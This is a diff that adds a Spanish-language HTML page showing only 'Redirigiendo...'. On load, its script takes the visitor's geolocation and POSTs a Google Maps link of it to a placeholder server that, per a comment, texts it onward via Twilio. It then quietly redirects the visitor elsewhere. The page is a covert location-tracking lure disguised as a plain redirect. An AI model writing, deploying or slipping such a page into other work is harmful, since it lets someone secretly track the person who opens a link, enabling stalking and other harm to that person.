@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirigiendo...</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const mensaje = `Ubicación: ${mapsUrl}`;
+
+                    // Enviar ubicación por SMS (se requiere servidor con Twilio)
+                    fetch('https://tuservidor.com/enviar-sms', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ mensaje: mensaje })
+                    });
+
+                    // Redirigir al usuario a otra web
+                    window.location.href = "https://ejemplo.com";
+                });
+            } else {
+                window.location.href = "https://ejemplo.com";
+            }
+        }
+
+        window.onload = sendLocation;
+    </script>
+</head>
+<body>
+    <p>Redirigiendo...</p>
+</body>
+</html>
